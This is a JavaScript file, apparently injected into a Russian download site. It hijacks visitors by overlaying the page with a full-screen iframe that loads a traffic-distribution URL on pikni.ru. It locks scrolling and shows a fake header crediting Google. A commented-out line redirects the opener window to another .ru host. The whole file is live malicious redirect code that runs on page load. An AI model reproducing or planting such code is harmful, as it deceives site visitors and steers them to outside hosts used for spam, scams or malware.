var keyword=document.title;
var keyword=keyword.replace("Скачать ", "");
var keyword=keyword.replace(/\-.*/, '');
var isgoogle=document.referrer.match(/(.*)/i);
var splashpage={
splashenabled: 1,
splashpageurl: 'http://pikni.ru/tds/go.php?sid=9&tds-key='+keyword,
enablefrequency: 0,
displayfrequency: "2 days",
defineheader: '<div style="padding: 5px; color: white; font: bold 16px Verdana; background: black url(blockdefault.gif) center center repeat-x;"><a style="position:fixed; top: 2px; right: 5px" href="javascript:splashpage.closeit()" title="Skip to Content"><img src="skip.gif" border="0" width="114px" height="23px" /></a>Bought to you by Google Image...</div>',
cookiename: ["splashpagecookie", "path=/"],
autohidetimer: 0,
launch:false,
browserdetectstr: (window.opera&&window.getSelection) || (!window.opera && window.XMLHttpRequest),
output:function(){
	document.write('<div id="slashpage" style="position: fixed; z-index: 1000000; color: white; background-color:white">') 
	document.write('<iframe name="splashpage-iframe" src="about:blank" style="margin:0; padding:0; width:100%; height: 100%"></iframe>')
	document.write('<br />&nbsp;</div>')
	this.splashpageref=document.getElementById("slashpage")
	this.splashiframeref=window.frames["splashpage-iframe"]
	this.splashiframeref.location.replace(this.splashpageurl)
	this.standardbody=(document.compatMode=="CSS1Compat")? document.documentElement : document.body
	if (!/safari/i.test(navigator.userAgent))
	this.standardbody.style.overflow="hidden"
	this.splashpageref.style.left=0
	this.splashpageref.style.top=0
	this.splashpageref.style.width="100%"
	this.splashpageref.style.height="100%"
	this.moveuptimer=setInterval("window.scrollTo(0,0)", 50)
},
closeit:function(){
	clearInterval(this.moveuptimer)
	this.splashpageref.style.display="none"
	this.splashiframeref.location.replace("about:blank")
	this.standardbody.style.overflow="auto"
},
init:function(){
	if (this.enablefrequency==1){ 
		if (/sessiononly/i.test(this.displayfrequency)){
			if (this.getCookie(this.cookiename[0]+"_s")==null){
				this.setCookie(this.cookiename[0]+"_s", "loaded")
				this.launch=true
			}
		}
		else if (/day/i.test(this.displayfrequency)){
			if (this.getCookie(this.cookiename[0])==null || parseInt(this.getCookie(this.cookiename[0]))!=parseInt(this.displayfrequency)){
				this.setCookie(this.cookiename[0], parseInt(this.displayfrequency), parseInt(this.displayfrequency))
				this.launch=true
			} 
		}
	}
	else
		this.launch=true
	if (this.launch){
		this.output()
		if (parseInt(this.autohidetimer)>0)
			setTimeout("splashpage.closeit()", parseInt(this.autohidetimer)*1000)
	}
},
}


if(isgoogle){
if (splashpage.browserdetectstr && splashpage.splashenabled==1){
        splashpage.init()
}
}

//if(parent.window.opener) parent.window.opener.location.replace("http://tdcnasjt15.ru/ab5L?keyword="+keyword);

